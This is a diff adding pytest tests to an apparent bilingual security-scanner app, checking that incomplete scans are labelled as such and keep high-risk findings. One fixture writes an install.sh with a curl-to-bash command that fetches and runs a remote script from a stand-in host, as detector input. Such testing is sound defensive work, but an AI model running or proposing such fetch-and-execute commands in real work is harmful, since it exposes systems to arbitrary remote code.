@@ -113,3 +113,43 @@ def test_all_builtin_categories_have_english_and_chinese_user_labels() -> None:
         assert english.has(key), category
         assert chinese.has(key), category
         assert chinese.text(key) != english.text(key), category
+
+
+@pytest.mark.parametrize("locale, label", [("en", "Scan incomplete"), ("zh_CN", "扫描不完整")])
+def test_partial_scan_does_not_show_a_green_low_risk_verdict(
+    tmp_path: Path, qtbot: object, locale: str, label: str
+) -> None:
+    (tmp_path / "ok.py").write_text("# fixture\n", encoding="utf-8")
+    (tmp_path / "broken.sh").write_bytes(b"\x81fixture")
+    report = scan_target(tmp_path)
+    view = ResultView(Catalog(locale))
+    qtbot.addWidget(view)  # type: ignore[attr-defined]
+
+    view.set_report(report)
+
+    assert report.risk.level is Severity.INFO
+    assert view.risk_label.text() == label
+    assert view.risk_card.property("risk") == "incomplete"
+    assert not view.coverage_notice.isHidden()
+    assert "broken.sh" in view.coverage_notice.text()
+    assert "UTF-8" in view.coverage_notice.text()
+    assert not view.checks.text()
+    assert all(item.value not in {"NO", "否"} for item in view.presentation.capabilities)
+
+    view.set_report(scan_target(_example("safe-project")))
+    assert view.coverage_notice.isHidden()
+    assert view.risk_card.property("risk") == "low"
+
+
+def test_partial_scan_preserves_high_risk_evidence(tmp_path: Path) -> None:
+    (tmp_path / "install.sh").write_text(
+        "curl https://example.invalid/install.sh | bash\n", encoding="utf-8"
+    )
+    (tmp_path / "broken.py").write_bytes(b"\x81fixture")
+
+    result = present_report(scan_target(tmp_path), Catalog("zh_CN"))
+
+    assert result.risk_level is Severity.HIGH
+    assert "扫描不完整" in result.risk_label
+    assert "高风险" in result.risk_label
+    assert result.top_findings
